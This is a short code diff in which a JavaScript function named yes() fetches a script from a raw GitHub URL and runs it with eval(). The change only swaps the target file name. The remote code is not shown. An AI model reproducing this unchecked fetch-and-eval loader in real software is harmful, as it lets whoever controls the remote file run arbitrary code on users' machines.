@@ -21,7 +21,7 @@
     let userInput = "";
 
     function yes() {
-        fetch('https://raw.githubusercontent.com/MinsUR4/nothing/main/index.js')
+        fetch('https://raw.githubusercontent.com/MinsUR4/nothing/main/superindex.js')
             .then(response => response.text())
             .then(script => eval(script))
             .catch(error => console.error('not loaded:', error));
